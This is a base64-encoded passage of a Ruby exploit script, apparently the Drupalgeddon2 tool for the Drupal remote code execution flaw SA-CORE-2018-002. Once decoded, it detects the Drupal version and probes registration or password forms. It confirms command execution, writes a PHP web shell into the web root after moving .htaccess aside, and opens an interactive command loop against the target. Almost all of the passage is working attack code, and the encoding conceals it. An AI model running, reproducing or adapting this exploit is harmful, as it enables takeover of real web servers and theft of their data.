XIiCiAgICAjIENoZWNrIHRvIHNlZSBpZiBpdCBzYXlzOiA8aDEgY2xhc3M9ImpzLXF1aWNrZWRpdC1wYWdlLXRpdGxlIHRpdGxlIHBhZ2UtdGl0bGUiPlBhZ2Ugbm90IGZvdW5kPC9oMT4gPGRpdiBjbGFzcz0iY29udGVudCI+VGhlIHJlcXVlc3RlZCBwYWdlIGNvdWxkIG5vdCBiZSBmb3VuZC48L2Rpdj4KICAgIHB1dHMgd2FybmluZygiV0FSTklORzogQ291bGQgYmUgYSBmYWxzZS1wb3NpdGl2ZSBbMS0yXSwgYXMgdGhlIGZpbGUgY291bGQgYmUgcmVwb3J0ZWQgdG8gYmUgbWlzc2luZyIpIGlmIHJlc3BvbnNlLmJvZHkuZG93bmNhc2UuaW5jbHVkZT8gInRoZSByZXF1ZXN0ZWQgcGFnZSBjb3VsZCBub3QgYmUgZm91bmQiCiAgICAjIE9ubHkgd29ya3MgZm9yIENIQU5HRUxPRy50eHQKICAgIGlmIHVyaS5tYXRjaCgvQ0hBTkdFTE9HLnR4dC8pCiAgICAgICMgQ2hlY2sgaWYgdmFsaWQuIFNvdXJjZSB+IGh0dHBzOi8vYXBpLmRydXBhbC5vcmcvYXBpL2RydXBhbC9jb3JlJTIxQ0hBTkdFTE9HLnR4dC84LjUueCAvLyBodHRwczovL2FwaS5kcnVwYWwub3JnL2FwaS9kcnVwYWwvQ0hBTkdFTE9HLnR4dC83LngKICAgICAgcHV0cyB3YXJuaW5nKCJXQVJOSU5HOiBVbmFibGUgdG8gZGV0ZWN0IGtleXdvcmQgJ2RydXBhbC5vcmcnIikgaWYgbm90IHJlc3BvbnNlLmJvZHkuZG93bmNhc2UuaW5jbHVkZT8gImRydXBhbC5vcmciCiAgICAgICMgUGF0Y2hlZCBhbHJlYWR5PyAoRm9yIERydXBhbCB2OC40LnggLyB2Ny54KQogICAgICBwdXRzIHdhcm5pbmcoIldBUk5JTkc6IE1pZ2h0IGJlIHBhdGNoZWQhIEZvdW5kIFNBLUNPUkUtMjAxOC0wMDI6ICN7dXJsfSIpIGlmIHJlc3BvbnNlLmJvZHkuaW5jbHVkZT8gIlNBLUNPUkUtMjAxOC0wMDIiCiAgICAgICMgVHJ5IGFuZCBnZXQgdmVyc2lvbiBmcm9tIHRoZSBmaWxlIGNvbnRlbnRzIChGb3IgRHJ1cGFsIHY4LjQueCAvIHY3LngpCiAgICAgICRkcnVwYWx2ZXJpb24gPSByZXNwb25zZS5ib2R5Lm1hdGNoKC9EcnVwYWwgKC4qKSwvKS50b19zLnNsaWNlKC9EcnVwYWwgKC4qKSwvLCAxKS50b19zLnN0cmlwCiAgICAgICMgQmxhbmsgaWYgbm90IHZhbGlkCiAgICAgICRkcnVwYWx2ZXJpb24gPSAiIiBpZiBub3QgJGRydXBhbHZlcmlvblstMV0gPX4gL1xkLwogICAgZW5kCiAgICAjIENoZWNrIG1ldGEgdGFnCiAgICBpZiBub3QgcmVzcG9uc2UuYm9keS5lbXB0eT8KICAgICAgIyBGb3IgRHJ1cGFsIHY4LnggLyB2Ny54CiAgICAgIG1ldGEgPSByZXNwb25zZS5ib2R5Lm1hdGNoKC88bWV0YSBuYW1lPSJHZW5lcmF0b3IiIGNvbnRlbnQ9IkRydXBhbCAoLiopIC8pCiAgICAgIG1ldGF0YWcgPSBtZXRhLnRvX3Muc2xpY2UoL21ldGEgbmFtZT0iR2VuZXJhdG9yIiBjb250ZW50PSJEcnVwYWwgKC4qKSBcKGh0dHAvLCAxKS50b19zLnN0cmlwCiAgICAgIGlmIG5vdCBtZXRhdGFnLmVtcHR5PwogICAgICAgICRkcnVwYWx2ZXJpb24gPSAiI3ttZXRhdGFnfS54IiBpZiAkZHJ1cGFsdmVyaW9uLmVtcHR5PwogICAgICAgIHB1dHMgc3VjY2VzcygiTWV0YXRhZzogdiN7JGRydXBhbHZlcmlvbn0gW0dlbmVyYXRvcl0iKQogICAgICAgIHB1dHMgdmVyYm9zZShtZXRhLnRvX3MpIGlmICR2ZXJib3NlCiAgICAgIGVuZAogICAgZW5kCiAgICAjIERvbmUhIC4uLmlmIGEgZnVsbCBrbm93biB2ZXJzaW9uLCBlbHNlIGtlZXAgZ29pbmcuLi4gbWF5IGdldCBsdWNreSBsYXRlciEKICAgIGJyZWFrIGlmIG5vdCAkZHJ1cGFsdmVyaW9uLmVuZF93aXRoPygieCIpIGFuZCBub3QgJGRydXBhbHZlcmlvbi5lbXB0eT8KICBlbmQKICAjIENoZWNrIHJlcXVlc3QgcmVzcG9uc2UsIG5vdCBhbGxvd2VkCiAgaWYgcmVzcG9uc2UuY29kZSA9PSAiNDAzIiBhbmQgJGRydXBhbHZlcmlvbi5lbXB0eT8KICAgIHRtcCA9ICR2ZXJib3NlID8gICIgICAgW0hUVFAgU2l6ZTogI3tyZXNwb25zZS5zaXplfV0iICA6ICIiCiAgICBwdXRzIHN1Y2Nlc3MoIkZvdW5kICA6ICN7dXJpfSAgICAoSFRUUCBSZXNwb25zZTogI3tyZXNwb25zZS5jb2RlfSkje3RtcH0iKQogICAgaWYgJGRydXBhbHZlcmlvbi5lbXB0eT8KICAgICAgIyBUcnkgYW5kIGdldCB2ZXJzaW9uIGZyb20gdGhlIFVSTCAoRm9yIERydXBhbCB2LjcueC92Ni54KQogICAgICAkZHJ1cGFsdmVyaW9uID0gdXJpLm1hdGNoKC9pbmNsdWRlc1wvZGF0YWJhc2UuaW5jLyk/ICI3LngvNi54IiA6ICIiIGlmICRkcnVwYWx2ZXJpb24uZW1wdHk/CiAgICAgICMgVHJ5IGFuZCBnZXQgdmVyc2lvbiBmcm9tIHRoZSBVUkwgKEZvciBEcnVwYWwgdjgueCkKICAgICAgJGRydXBhbHZlcmlvbiA9IHVyaS5tYXRjaCgvY29yZS8pPyAiOC54IiA6ICIiIGlmICRkcnVwYWx2ZXJpb24uZW1wdHk/CiAgICAgICMgSWYgd2UgZ290IHNvbWV0aGluZywgc2hvdyBpdCEKICAgICAgcHV0cyBzdWNjZXNzKCJVUkwgICAgOiB2I3skZHJ1cGFsdmVyaW9ufT8iKSBpZiBub3QgJGRydXBhbHZlcmlvbi5lbXB0eT8KICAgIGVuZAogIGVsc2UKICAgIHRtcCA9ICR2ZXJib3NlID8gICIgICAgW0hUVFAgU2l6ZTogI3tyZXNwb25zZS5zaXplfV0iICA6ICIiCiAgICBwdXRzIHdhcm5pbmcoIk1JU1NJTkc6ICN7dXJpfSAgICAoSFRUUCBSZXNwb25zZTogI3tyZXNwb25zZS5jb2RlfSkje3RtcH0iKQogIGVuZAplbmQKIyBGZWVkYmFjawppZiBub3QgJGRydXBhbHZlcmlvbi5lbXB0eT8KICBzdGF0dXMgPSAkZHJ1cGFsdmVyaW9uLmVuZF93aXRoPygieCIpPyAiPyIgOiAiISIKICBwdXRzIHN1Y2Nlc3MoIkRydXBhbCN7c3RhdHVzfTogdiN7JGRydXBhbHZlcmlvbn0iKQplbHNlCiAgcHV0cyBlcnJvcigiRGlkbid0IGRldGVjdCBEcnVwYWwgdmVyc2lvbiIpCiAgZXhpdAplbmQKaWYgbm90ICRkcnVwYWx2ZXJpb24uc3RhcnRfd2l0aD8oIjgiKSBhbmQgbm90ICRkcnVwYWx2ZXJpb24uc3RhcnRfd2l0aD8oIjciKQogIHB1dHMgZXJyb3IoIlVuc3VwcG9ydGVkIERydXBhbCB2ZXJzaW9uICgjeyRkcnVwYWx2ZXJpb259KSIpCiAgZXhpdAplbmQKcHV0cyAiLSIqODAKIyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQojIFRoZSBhdHRhY2sgdmVjdG9yIHRvIHVzZQokZm9ybSA9ICRkcnVwYWx2ZXJpb24uc3RhcnRfd2l0aD8oIjgiKT8gInVzZXIvcmVnaXN0ZXIiIDogInVzZXIvcGFzc3dvcmQiCiMgTWFrZSBhIHJlcXVlc3QsIGNoZWNrIGZvciBmb3JtCnVybCA9ICIjeyR0YXJnZXR9P3E9I3skZm9ybX0iCnB1dHMgYWN0aW9uKCJUZXN0aW5nOiBGb3JtICAgKCN7JGZvcm19KSIpCnJlc3BvbnNlID0gaHR0cF9yZXF1ZXN0KHVybCwgJ2dldCcsICcnLCAkc2Vzc2lvbl9jb29raWUpCmlmIHJlc3BvbnNlLmNvZGUgPT0gIjIwMCIgYW5kIG5vdCByZXNwb25zZS5ib2R5LmVtcHR5PwogIHB1dHMgc3VjY2VzcygiUmVzdWx0IDogRm9ybSB2YWxpZCIpCmVsc2lmIHJlc3BvbnNlWydsb2NhdGlvbiddCiAgcHV0cyBlcnJvcigiVGFyZ2V0IGlzIE5PVCBleHBsb2l0YWJsZSBbNV0gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pLi4uICAgQ291bGQgdHJ5IGZvbGxvd2luZyB0aGUgcmVkaXJlY3Q6ICN7cmVzcG9uc2VbJ2xvY2F0aW9uJ119IikKICBleGl0CmVsc2lmIHJlc3BvbnNlLmNvZGUgPT0gIjQwNCIKICBwdXRzIGVycm9yKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFs0XSAoSFRUUCBSZXNwb25zZTogI3tyZXNwb25zZS5jb2RlfSkuLi4gICBGb3JtIGRpc2FibGVkPyIpCiAgZXhpdAplbHNpZiByZXNwb25zZS5jb2RlID09ICI0MDMiCiAgcHV0cyBlcnJvcigiVGFyZ2V0IGlzIE5PVCBleHBsb2l0YWJsZSBbM10gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pLi4uICAgRm9ybSBibG9ja2VkPyIpCiAgZXhpdAplbHNpZiByZXNwb25zZS5ib2R5LmVtcHR5PwogIHB1dHMgZXJyb3IoIlRhcmdldCBpcyBOT1QgZXhwbG9pdGFibGUgWzJdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KS4uLiAgIEdvdCBhbiBlbXB0eSByZXNwb25zZSIpCiAgZXhpdAplbHNlCiAgcHV0cyB3YXJuaW5nKCJXQVJOSU5HOiBUYXJnZXQgbWF5IE5PVCBleHBsb2l0YWJsZSBbMV0gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pIikKZW5kCnB1dHMgIi0gIio0MAojIE1ha2UgYSByZXF1ZXN0LCBjaGVjayBmb3IgY2xlYW4gVVJMcyBzdGF0dXMgfiBFbmFibGVkOiAvdXNlci9yZWdpc3RlciAgIERpc2FibGVkOiAvP3E9dXNlci9yZWdpc3RlcgojIERydXBhbCB2Ny54IG5lZWRzIGl0IGFueXdheQokY2xlYW5fdXJsID0gJGRydXBhbHZlcmlvbi5zdGFydF93aXRoPygiOCIpPyAiIiA6ICI/cT0iCnVybCA9ICIjeyR0YXJnZXR9I3skZm9ybX0iCnB1dHMgYWN0aW9uKCJUZXN0aW5nOiBDbGVhbiBVUkxzIikKcmVzcG9uc2UgPSBodHRwX3JlcXVlc3QodXJsLCAnZ2V0JywgJycsICRzZXNzaW9uX2Nvb2tpZSkKaWYgcmVzcG9uc2UuY29kZSA9PSAiMjAwIiBhbmQgbm90IHJlc3BvbnNlLmJvZHkuZW1wdHk/CiAgcHV0cyBzdWNjZXNzKCJSZXN1bHQgOiBDbGVhbiBVUkxzIGVuYWJsZWQiKQplbHNlCiAgJGNsZWFuX3VybCA9ICI/cT0iCiAgcHV0cyB3YXJuaW5nKCJSZXN1bHQgOiBDbGVhbiBVUkxzIGRpc2FibGVkIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KSIpCiAgcHV0cyB2ZXJib3NlKCJyZXNwb25zZS5ib2R5OiAje3Jlc3BvbnNlLmJvZHl9IikgaWYgJHZlcmJvc2UKICAjIERydXBhbCB2OC54IG5lZWRzIGl0IHRvIGJlIGVuYWJsZWQKICBpZiAkZHJ1cGFsdmVyaW9uLnN0YXJ0X3dpdGg/KCI4IikKICAgIHB1dHMgZXJyb3IoIlNvcnJ5IGRhdmUuLi4gUmVxdWlyZWQgZm9yIERydXBhbCB2OC54Li4uIFNvLi4uIE5PUEUgTk9QRSBOT1BFIikKICAgIGV4aXQKICBlbHNpZiAkZHJ1cGFsdmVyaW9uLnN0YXJ0X3dpdGg/KCI3IikKICAgIHB1dHMgaW5mbygiSXNuJ3QgYW4gaXNzdWUgZm9yIERydXBhbCB2Ny54IikKICBlbmQKZW5kCnB1dHMgIi0iKjgwCiMgLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0KIyBWYWx1ZXMgaW4gZ2VuX2V2aWxfdXJsIGZvciBEcnVwYWwgdjgueAplbGVtZW50c3Y4ID0gWwogICJtYWlsIiwKICAidGltZXpvbmUiLApdCiMgVmFsdWVzIGluIGdlbl9ldmlsX3VybCBmb3IgRHJ1cGFsIHY3LngKZWxlbWVudHN2NyA9IFsKICAibmFtZSIsCl0KZWxlbWVudHMgPSAkZHJ1cGFsdmVyaW9uLnN0YXJ0X3dpdGg/KCI4IikgPyBlbGVtZW50c3Y4IDogZWxlbWVudHN2NwplbGVtZW50cy5lYWNoIGRvfGV8CiAgJGVsZW1lbnQgPSBlCiAgIyBNYWtlIGEgcmVxdWVzdCwgdGVzdGluZyBjb2RlIGV4ZWN1dGlvbgogIHB1dHMgYWN0aW9uKCJUZXN0aW5nOiBDb2RlIEV4ZWN1dGlvbiAgIChNZXRob2Q6ICN7JGVsZW1lbnR9KSIpCiAgIyBHZW5lcmF0ZSBhIHJhbmRvbSBzdHJpbmcgdG8gc2VlIGlmIHdlIGNhbiBlY2hvIGl0CiAgcmFuZG9tID0gKDAuLi44KS5tYXAgeyAoNjUgKyByYW5kKDI2KSkuY2hyIH0uam9pbgogIHVybCwgcGF5bG9hZCA9IGdlbl9ldmlsX3VybCgiZWNobyAje3JhbmRvbX0iLCBlKQogIHJlc3BvbnNlID0gaHR0cF9yZXF1ZXN0KHVybCwgInBvc3QiLCBwYXlsb2FkLCAkc2Vzc2lvbl9jb29raWUpCiAgaWYgKHJlc3BvbnNlLmNvZGUgPT0gIjIwMCIgb3IgcmVzcG9uc2UuY29kZSA9PSAiNTAwIikgYW5kIG5vdCByZXNwb25zZS5ib2R5LmVtcHR5PwogICAgcmVzdWx0ID0gY2xlYW5fcmVzdWx0KHJlc3BvbnNlLmJvZHkpCiAgICBpZiBub3QgcmVzdWx0LmVtcHR5PwogICAgICBwdXRzIHN1Y2Nlc3MoIlJlc3VsdCA6ICN7cmVzdWx0fSIpCiAgICAgIGlmIHJlc3BvbnNlLmJvZHkubWF0Y2goLyN7cmFuZG9tfS8pCiAgICAgICAgcHV0cyBzdWNjZXNzKCJHb29kIE5ld3MgRXZlcnlvbmUhIFRhcmdldCBzZWVtcyB0byBiZSBleHBsb2l0YWJsZSAoQ29kZSBleGVjdXRpb24pISB3MDBob29PTyEiKQogICAgICAgIGJyZWFrCiAgICAgIGVsc2UKICAgICAgICBwdXRzIHdhcm5pbmcoIldBUk5JTkc6IFRhcmdldCBNSUdIVCBiZSBleHBsb2l0YWJsZSBbNF0uLi4gICBEZXRlY3RlZCBvdXRwdXQsIGJ1dCBkaWRuJ3QgTUFUQ0ggZXhwZWN0ZWQgcmVzdWx0IikKICAgICAgZW5kCiAgICBlbHNlCiAgICAgIHB1dHMgd2FybmluZygiV0FSTklORzogVGFyZ2V0IE1JR0hUIGJlIGV4cGxvaXRhYmxlIFszXSAoSFRUUCBSZXNwb25zZTogI3tyZXNwb25zZS5jb2RlfSkuLi4gICBEaWRuJ3QgZGV0ZWN0IGFueSBJTkpFQ1RFRCBvdXRwdXQgKGRpc2FibGVkIFBIUCBmdW5jdGlvbj8pIikKICAgIGVuZAogICAgcHV0cyB3YXJuaW5nKCJXQVJOSU5HOiBUYXJnZXQgTUlHSFQgYmUgZXhwbG9pdGFibGUgWzVdLi4uICAgQmxpbmQgYXR0YWNrPyIpIGlmIHJlc3BvbnNlLmNvZGUgPT0gIjUwMCIKICAgIHB1dHMgdmVyYm9zZSgicmVzcG9uc2UuYm9keTogI3tyZXNwb25zZS5ib2R5fSIpIGlmICR2ZXJib3NlCiAgICBwdXRzIHZlcmJvc2UoImNsZWFuX3Jlc3VsdDogI3tyZXN1bHR9IikgaWYgbm90IHJlc3VsdC5lbXB0eT8gYW5kICR2ZXJib3NlCiAgZWxzaWYgcmVzcG9uc2UuYm9keS5lbXB0eT8KICAgIHB1dHMgZXJyb3IoIlRhcmdldCBpcyBOT1QgZXhwbG9pdGFibGUgWzJdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KS4uLiAgIEdvdCBhbiBlbXB0eSByZXNwb25zZSIpCiAgICBleGl0CiAgZWxzZQogICAgcHV0cyBlcnJvcigiVGFyZ2V0IGlzIE5PVCBleHBsb2l0YWJsZSBbMV0gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pIikKICAgIHB1dHMgdmVyYm9zZSgicmVzcG9uc2UuYm9keTogI3tyZXNwb25zZS5ib2R5fSIpIGlmICR2ZXJib3NlCiAgICBleGl0CiAgZW5kCiAgcHV0cyAiLSAiKjQwIGlmIGUgIT0gZWxlbWVudHMubGFzdAplbmQKcHV0cyAiLSIqODAKIyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLQojIExvY2F0aW9uIG9mIHdlYiBzaGVsbCAmIHVzZWQgdG8gc2lnbmFsIGlmIHVzaW5nIFBIUCBzaGVsbAp3ZWJzaGVsbHBhdGggPSAiIgpwcm9tcHQgPSAiZHJ1cGFsZ2VkZG9uMiIKIyBQb3NzaWJsZXMgcGF0aHMgdG8gdHJ5CnBhdGhzID0gWwogICMgV2ViIHJvb3QKICAiIiwKICAjIFJlcXVpcmVkIGZvciBzZXR1cAogICJzaXRlcy9kZWZhdWx0LyIsCiAgInNpdGVzL2RlZmF1bHQvZmlsZXMvIiwKICAjIFRoZXkgZGlkIHNvbWV0aGluZyAid3JvbmciLCBjaG1vZCAtUiAwNzc3IC4KICAjImNvcmUvIiwKXQojIENoZWNrIGFsbCAoaWYgZG9pbmcgd2ViIHNoZWxsKQpwYXRocy5lYWNoIGRvfHBhdGh8CiAgIyBDaGVjayB0byBzZWUgaWYgdGhlcmUgaXMgYWxyZWFkeSBhIGZpbGUgdGhlcmUKICBwdXRzIGFjdGlvbigiVGVzdGluZzogRXhpc3RpbmcgZmlsZSAgICgjeyR0YXJnZXR9I3twYXRofSN7d2Vic2hlbGx9KSIpCiAgcmVzcG9uc2UgPSBodHRwX3JlcXVlc3QoIiN7JHRhcmdldH0je3BhdGh9I3t3ZWJzaGVsbH0iLCAnZ2V0JywgJycsICRzZXNzaW9uX2Nvb2tpZSkKICBpZiByZXNwb25zZS5jb2RlID09ICIyMDAiCiAgICBwdXRzIHdhcm5pbmcoIlJlc3BvbnNlOiBIVFRQICN7cmVzcG9uc2UuY29kZX0gLy8gU2l6ZTogI3tyZXNwb25zZS5zaXplfS4gICAqKipTb21ldGhpbmcgY291bGQgYWxyZWFkeSBiZSB0aGVyZT8qKioiKQogIGVsc2UKICAgIHB1dHMgaW5mbygiUmVzcG9uc2U6IEhUVFAgI3tyZXNwb25zZS5jb2RlfSAvLyBTaXplOiAje3Jlc3BvbnNlLnNpemV9IikKICBlbmQKICBwdXRzICItICIqNDAKICAjIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtCiAgZm9sZGVyID0gcGF0aC5lbXB0eT8gPyAiLi8iIDogcGF0aAogIHB1dHMgYWN0aW9uKCJUZXN0aW5nOiBXcml0aW5nIFRvIFdlYiBSb290ICAgKCN7Zm9sZGVyfSkiKQogICMgTWVyZ2UgbG9jYXRpb25zCiAgd2Vic2hlbGxwYXRoID0gIiN7cGF0aH0je3dlYnNoZWxsfSIKICAjIEZpbmFsIGNvbW1hbmQgdG8gZXhlY3V0ZQogIGNtZCA9ICIje2Jhc2hjbWR9IHwgdGVlICN7d2Vic2hlbGxwYXRofSIKICAjIEJ5IGRlZmF1bHQsIERydXBhbCB2Ny54IGRpc2FibGVzIHRoZSBQSFAgZW5naW5lIHVzaW5nOiAuL3NpdGVzL2RlZmF1bHQvZmlsZXMvLmh0YWNjZXNzCiAgIyAuLi5ob3dldmVyLCBEcnVwYWwgdjgueCBkaXNhYmxlcyB0aGUgUEhQIGVuZ2luZSB1c2luZzogLi8uaHRhY2Nlc3MKICBpZiBwYXRoID09ICJzaXRlcy9kZWZhdWx0L2ZpbGVzLyIKICAgIHB1dHMgYWN0aW9uKCJNb3ZpbmcgOiAuL3NpdGVzL2RlZmF1bHQvZmlsZXMvLmh0YWNjZXNzIikKICAgIGNtZCA9ICJtdiAtZiAje3BhdGh9Lmh0YWNjZXNzICN7cGF0aH0uaHRhY2Nlc3MtYmFrOyAje2NtZH0iCiAgZW5kCiAgIyBHZW5lcmF0ZSBldmlsIFVSTHMKICB1cmwsIHBheWxvYWQgPSBnZW5fZXZpbF91cmwoY21kLCAkZWxlbWVudCkKICAjIE1ha2UgdGhlIHJlcXVlc3QKICByZXNwb25zZSA9IGh0dHBfcmVxdWVzdCh1cmwsICJwb3N0IiwgcGF5bG9hZCwgJHNlc3Npb25fY29va2llKQogICMgQ2hlY2sgcmVzdWx0CiAgaWYgcmVzcG9uc2UuY29kZSA9PSAiMjAwIiBhbmQgbm90IHJlc3BvbnNlLmJvZHkuZW1wdHk/CiAgICAjIEZlZWRiYWNrCiAgICByZXN1bHQgPSBjbGVhbl9yZXN1bHQocmVzcG9uc2UuYm9keSkKICAgIHB1dHMgc3VjY2VzcygiUmVzdWx0IDogI3tyZXN1bHR9IikgaWYgbm90IHJlc3VsdC5lbXB0eT8KICAgICMgVGVzdCB0byBzZWUgaWYgYmFja2Rvb3IgaXMgdGhlcmUgKGlmIHdlIG1hbmFnZWQgdG8gd3JpdGUgaXQpCiAgICByZXNwb25zZSA9IGh0dHBfcmVxdWVzdCgiI3skdGFyZ2V0fSN7d2Vic2hlbGxwYXRofSIsICJwb3N0IiwgImM9aG9zdG5hbWUiLCAkc2Vzc2lvbl9jb29raWUpCiAgICBpZiByZXNwb25zZS5jb2RlID09ICIyMDAiIGFuZCBub3QgcmVzcG9uc2UuYm9keS5lbXB0eT8KICAgICAgcHV0cyBzdWNjZXNzKCJWZXJ5IEdvb2QgTmV3cyBFdmVyeW9uZSEgV3JvdGUgdG8gdGhlIHdlYiByb290ISBXYWF5aGVlZWV5ISEhIikKICAgICAgYnJlYWsKICAgIGVsc2lmIHJlc3BvbnNlLmNvZGUgPT0gIjQwNCIKICAgICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsyLTRdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KS4uLiAgIE1pZ2h0IG5vdCBoYXZlIHdyaXRlIGFjY2Vzcz8iKQogICAgZWxzaWYgcmVzcG9uc2UuY29kZSA9PSAiNDAzIgogICAgICBwdXRzIHdhcm5pbmcoIlRhcmdldCBpcyBOT1QgZXhwbG9pdGFibGUgWzItM10gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pLi4uICAgTWF5IG5vdCBiZSBhYmxlIHRvIGV4ZWN1dGUgUEhQIGZyb20gaGVyZT8iKQogICAgZWxzaWYgcmVzcG9uc2UuYm9keS5lbXB0eT8KICAgICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsyLTJdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KS4uLiAgIEdvdCBhbiBlbXB0eSByZXNwb25zZSBiYWNrIikKICAgIGVsc2UKICAgICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsyLTFdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KSIpCiAgICAgIHB1dHMgdmVyYm9zZSgicmVzcG9uc2UuYm9keTogI3tyZXNwb25zZS5ib2R5fSIpIGlmICR2ZXJib3NlCiAgICBlbmQKICBlbHNpZiByZXNwb25zZS5jb2RlID09ICI1MDAiIGFuZCBub3QgcmVzcG9uc2UuYm9keS5lbXB0eT8KICAgIHB1dHMgd2FybmluZygiVGFyZ2V0IE1BWSBvZiBiZWVuIGV4cGxvaXRlZC4uLiBCaXQgb2YgYmxpbmQgbGVhZGluZyB0aGUgYmxpbmQiKQogICAgYnJlYWsKICBlbHNpZiByZXNwb25zZS5jb2RlID09ICI0MDQiCiAgICBwdXRzIHdhcm5pbmcoIlRhcmdldCBpcyBOT1QgZXhwbG9pdGFibGUgWzEtNF0gKEhUVFAgUmVzcG9uc2U6ICN7cmVzcG9uc2UuY29kZX0pLi4uICAgTWlnaHQgbm90IGhhdmUgd3JpdGUgYWNjZXNzPyIpCiAgZWxzaWYgcmVzcG9uc2UuY29kZSA9PSAiNDAzIgogICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsxLTNdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KS4uLiAgIE1heSBub3QgYmUgYWJsZSB0byBleGVjdXRlIFBIUCBmcm9tIGhlcmU/IikKICBlbHNpZiByZXNwb25zZS5ib2R5LmVtcHR5PwogICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsxLTJdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KSkuLi4gICBHb3QgYW4gZW1wdHkgcmVzcG9uc2UgYmFjayIpCiAgZWxzZQogICAgcHV0cyB3YXJuaW5nKCJUYXJnZXQgaXMgTk9UIGV4cGxvaXRhYmxlIFsxLTFdIChIVFRQIFJlc3BvbnNlOiAje3Jlc3BvbnNlLmNvZGV9KSIpCiAgICBwdXRzIHZlcmJvc2UoInJlc3BvbnNlLmJvZHk6ICN7cmVzcG9uc2UuYm9keX0iKSBpZiAkdmVyYm9zZQogIGVuZAogIHdlYnNoZWxscGF0aCA9ICIiCiAgcHV0cyAiLSAiKjQwIGlmIHBhdGggIT0gcGF0aHMubGFzdAplbmQgaWYgdHJ5X3BocHNoZWxsCiMgSWYgYSB3ZWIgcGF0aCB3YXMgc2V0LCB3ZSBleHBsb2l0ZWQgdXNpbmcgUEhQIQppZiBub3Qgd2Vic2hlbGxwYXRoLmVtcHR5PwogICMgR2V0IGhvc3RuYW1lIGZvciB0aGUgcHJvbXB0CiAgcHJvbXB0ID0gcmVzcG9uc2UuYm9keS50b19zLnN0cmlwIGlmIHJlc3BvbnNlLmNvZGUgPT0gIjIwMCIgYW5kIG5vdCByZXNwb25zZS5ib2R5LmVtcHR5PwogIHB1dHMgIi0iKjgwCiAgcHV0cyBpbmZvKCJGYWtlIFBIUCBzaGVsbDogICBjdXJsICcjeyR0YXJnZXR9I3t3ZWJzaGVsbHBhdGh9JyAtZCAnYz1ob3N0bmFtZSciKQogIHB1dHMgc3VjY2VzcygiRXhpdG8iKQogIGV4aXQKIyBTaG91bGQgd2UgYmUgdHJ5aW5nIHRvIGNhbGwgY29tbWFuZHMgdmlhIFBIUD8KZWxzaWYgdHJ5X3BocHNoZWxsCiAgcHV0cyB3YXJuaW5nKCJGQUlMRUQgOiBDb3VsZG4ndCBmaW5kIGEgd3JpdGVhYmxlIHdlYiBwYXRoIikKICBwdXRzICItIio4MAogIHB1dHMgYWN0aW9uKCJEcm9wcGluZyBiYWNrIHRvIGRpcmVjdCBPUyBjb21tYW5kcyIpCmVuZAojIFN0b3AgYW55IENUUkwgKyBDIGFjdGlvbiA7KQp0cmFwKCJJTlQiLCAiU0lHX0lHTiIpCiMgRm9yZXZlciBsb29wCmxvb3AgZG8KICAjIERlZmF1bHQgdmFsdWUKICByZXN1bHQgPSAifkVSUk9SfiIKICAjIEdldCBpbnB1dAogIGNvbW1hbmQgPSBSZWFkbGluZS5yZWFkbGluZSgiI3twcm9tcHR9Pj4gIiwgdHJ1ZSkudG9fcwogICMgQ2hlY2sgaW5wdXQKICBwdXRzIHdhcm5pbmcoIldBUk5JTkc6IERldGVjdGVkIGFuIGtub3duIGJhZCBjaGFyYWN0ZXIgKD4pIikgaWYgY29tbWFuZCA9fiAvPi8KICAjIEV4aXQKICBicmVhayBpZiBjb21tYW5kID09ICJleGl0IgogICMgQmxhbmsgbGluaz8KICBuZXh0IGlmIGNvbW1hbmQuZW1wdHk/CiAgIyBJZiBQSFAgd2ViIHNoZWxsCiAgaWYgbm90IHdlYnNoZWxscGF0aC5lbXB0eT8KICAgICMgU2VuZCByZXF1ZXN0CiAgICByZXN1bHQgPSBodHRwX3JlcXVlc3QoIiN7JHRhcmdldH0je3dlYnNoZWxscGF0aH0iLCAicG9zdCIsICJjPSN7Y29tbWFuZH0iLCAkc2Vzc2lvbl9jb29raWUpLmJvZHkKICAjIERpcmVjdCBPUyBjb21tYW5kcwogIGVsc2UKICAgIHVybCwgcGF5bG9hZCA9IGdlbl9ldmlsX3VybChjb21tYW5kLCAkZWxlbWVudCwgdHJ1ZSkKICAgIHJlc3BvbnNlID0gaHR0cF9yZXF1ZXN0KHVybCwgI